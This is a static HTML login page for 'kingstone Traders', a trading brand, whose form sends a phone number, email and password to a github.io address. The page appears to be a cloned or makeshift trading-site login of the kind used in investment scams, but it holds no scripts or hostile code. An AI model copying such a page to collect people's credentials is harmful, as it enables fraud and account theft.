<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>LISA KINGSTONE | Account Login</title>
    <link rel="icon" href="storage/app/public/photos/QdKEyMcH167GY17gRemDxDvmJwch7NV9fJVoxVcf.html" type="image/png"/>
    <link href="temp/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="temp/css/materialdesignicons.min.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="temp/css/line.css">
    <link href="temp/css/style.css" rel="stylesheet" type="text/css" />
    <link href="temp/css/colors/dark.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.css">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        .card {
            max-width: 400px;
            width: 100%;
            background: #000;
            border: none;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            color: #fff;
        }
        .card-body {
            padding: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            font-weight: bold;
            margin-bottom: 5px;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            background-color: #333;
            color: #fff;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #4caf50;
            color: #fff;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #45a049;
        }
        .text-center {
            text-align: center;
        }
        .text-white {
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-body">
                <h2 class="text-center">Welcome Back!</h2>
                <p class="text-center">To keep you connected, please login with your personal info.</p>
                <form method="POST" action="https://jasteeeeee.github.io/Fox-bit-KingStone-Traders.github.io/login">
                    <div class="form-group">
                        <label for="phone_number">Phone number <span class="text-danger">*</span></label>
                        <input type="tel" class="form-control" name="phone_number" id="phone_number" placeholder="07xxxxxxxx" required>
                    </div>
                    <div class="form-group">
                        <label for="email">Your Email <span class="text-danger">*</span></label>
                        <input type="email" class="form-control" name="email" id="email" placeholder="name@example.com" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password <span class="text-danger">*</span></label>
                        <input type="password" class="form-control" name="password" id="password" placeholder="Enter Password" required>
                    </div>
                    <div class="form-group">
                        <div class="d-flex justify-content-between">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="customCheck1" name="remember">
                                <label class="custom-control-label" for="customCheck1">Remember me</label>
                            </div>
                            <a href="forgot-password.html" class="text-white font-weight-bold">Forgot password ?</a>
                        </div>
                    </div>
                    <div class="form-group">
                        <button class="btn btn-success" type="submit">Sign in</button>
                    </div>
                    <div class="text-center form-group">
                        <p class="text-white">Don't have an account? <a href="index.html" class="font-weight-bold">Sign Up</a></p>
                    </div>
                </form>
                <div class="text-center">
                    <small>&copy; Copyright 2023 &nbsp; kingstone Traders &nbsp; All Rights Reserved.</small>
                </div>
            </div>
        </div>
    </div>
</body>
